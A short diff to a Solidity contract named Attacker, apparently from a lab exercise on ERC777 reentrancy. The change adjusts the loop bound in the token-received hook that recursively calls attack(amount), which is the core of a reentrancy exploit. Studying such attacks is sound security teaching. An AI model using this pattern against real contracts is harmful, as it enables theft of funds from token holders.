@@ -66,7 +66,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
     require(depth < max_depth, "invalid");
-    while (depth <= max_depth){
+    while (depth < max_depth){
       emit Recurse(depth);
       depth++;
       attack(amount);
